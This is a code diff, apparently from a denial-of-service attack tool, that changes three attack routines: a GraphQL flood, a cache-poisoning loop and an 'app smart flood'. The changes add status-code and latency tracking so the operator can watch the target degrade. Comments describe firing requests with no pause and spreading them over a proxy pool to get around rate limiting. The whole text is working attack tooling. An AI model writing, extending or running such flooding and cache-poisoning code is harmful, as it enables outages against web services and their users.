@@ -4488,15 +4488,17 @@ async function runGraphQLDoS(
         const ac    = new AbortController();
         const timer = setTimeout(() => ac.abort(), 12_000);
         try {
-          await fetch(url, {
+          const t0gql = Date.now();
+          const gres = await fetch(url, {
             method:  "POST",
             signal:  ac.signal,
             headers,
             body,
           });
           clearTimeout(timer);
+          workerTrackCode(gres.status, Date.now() - t0gql);
           localPkts++; localBytes += body.length + 200;
-        } catch { clearTimeout(timer); }
+        } catch { clearTimeout(timer); workerTrackCode(0); }
       } catch { /* swallow */ }
       // Tiny yield to avoid monopolising the event loop
       if (Math.random() < 0.05) await new Promise(r => setTimeout(r, 5));
@@ -4688,13 +4690,15 @@ async function runCachePoison(
         }
         try {
           const ac   = new AbortController();
+          const t0cp = Date.now();
           const t    = setTimeout(() => ac.abort(), 8_000);
           const res  = await fetch(url, { method: "GET", signal: ac.signal, headers: hdrs });
           clearTimeout(t);
+          workerTrackCode(res.status, Date.now() - t0cp);
           const body  = await res.arrayBuffer().catch(() => new ArrayBuffer(0));
           localPkts++;
           localBytes += body.byteLength || 500;
-        } catch { /* absorb */ }
+        } catch { workerTrackCode(0); /* absorb */ }
       }
       resolve();
     };
@@ -5733,13 +5737,15 @@ async function runAppSmartFlood(
         localPkts++; localBytes += bytes;
         return;
       }
+      const t0smart = Date.now();
       const res = await fetch(url, {
         method: "POST", headers: h, body, signal: AbortSignal.timeout(8000),
       });
+      workerTrackCode(res.status, Date.now() - t0smart);
       await res.body?.cancel();
       localPkts++;
       localBytes += body.length + 300;
-    } catch { /* target not accepting — expected */ }
+    } catch { workerTrackCode(0); /* target not accepting — expected */ }
   };
 
   // NO sleep — fire requests as fast as possible; proxy pool handles rate limiting
